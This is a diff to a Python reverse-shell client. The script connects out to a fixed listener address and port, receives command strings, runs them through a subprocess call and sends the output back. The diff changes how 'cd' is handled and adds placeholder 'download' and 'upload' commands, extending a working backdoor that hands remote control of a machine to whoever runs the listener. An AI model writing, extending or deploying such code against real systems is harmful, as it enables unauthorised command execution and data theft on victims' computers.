@@ -8,7 +8,7 @@ LHOST = "10.100.3.131"
 LPORT = 5555
 
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
+commands = ['download','upload']
 def checkConnection():
     try:
         client.send('')
@@ -33,7 +33,10 @@ def Cont():
                 msg = client.recv(2048).decode()
                 output = sp.getoutput(msg)
                 if msg.startswith('cd') and msg != 'cd':
-                    os.system(msg)
+                    os.chdir(msg.split(' ')[1])
+                elif msg.split(' ')[0] in commands:
+                    pass
+                    #TODO COMMANDS
                 else:
                     client.send(output.encode())
             except:
